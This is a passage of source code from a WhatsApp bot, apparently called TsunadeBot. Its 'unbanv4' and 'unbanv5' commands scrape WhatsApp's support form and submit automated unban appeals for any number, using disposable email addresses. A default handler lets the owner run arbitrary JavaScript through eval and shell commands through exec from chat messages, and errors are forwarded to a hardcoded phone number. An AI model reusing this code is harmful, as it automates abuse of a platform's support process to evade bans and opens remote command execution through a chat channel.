  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv4': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv5': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
    
default:

if (budy.startsWith('<')) {
if (!MznKingTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!MznKingTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!MznKingTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
TsunadeBot.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
TsunadeBot.sendMessage("94789481495@s.whatsapp.net", { text: "⚠️ *Error :* " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
